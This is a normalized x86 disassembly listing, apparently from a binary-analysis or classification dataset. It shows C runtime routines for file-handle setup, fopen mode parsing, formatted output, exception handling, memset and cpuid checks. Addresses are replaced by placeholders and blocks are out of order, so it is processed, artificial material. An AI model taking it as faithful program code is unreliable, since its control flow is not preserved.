mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_406995
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_40917b
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_406b2f
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40b91a
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_406bf6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40691e
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_405ca6
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_405ccc
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_406c6b
push 0x10
push r--data
call sub_405254
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_405cb9
and [ eax ] 0x0
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] edi
call sub_405ca6
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_405299
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_406995
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406bf6
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406d3d
mov eax [ ebp - 0x1c ]
sub_406d47
push 0x54
push r--data
call sub_405254
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_40aa2f
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_40aa2f
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_405299
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40b91a
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40b91a
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_406f9b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_40432c
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
push 0x1
push ebx
push eax
call sub_406c6b
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_405ca6
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_406c6b
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_406c6b
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_407138
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_40a714
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40c30c
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_40bba0
mov [ esi + 0x4 ] eax
sub_4071bf
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_405ea4
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_4071f2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_4071bf
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_407218
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_4071bf
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_405ca6
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_4071bf
sub_407265
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_407138
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_405ca6
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_405c3e
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_40432c
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4045c5
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_407dfd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_40cdb0
add esp 0x14
test eax eax
je r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_40d17f
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_40cffb
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_40cffb
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_40cffb
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_4080c6
push 0x10
push r--data
call sub_405254
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4081f5
mov eax edi
call sub_405299
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_40a9ea
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_40b91a
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_404db5
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_405e07
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_4090b8
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_405e75
pop ecx
pop ecx
sub_408200
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_408290
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40d2b1
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40d2d0
jmp r-xdata
sub_408290
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4045c5
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_408200
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4082f2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_408322
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408353
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40b3a8
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40b3a8
pop ecx
sub_408459
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4084b0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_4084b0
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_408459
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_40858f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_40853f
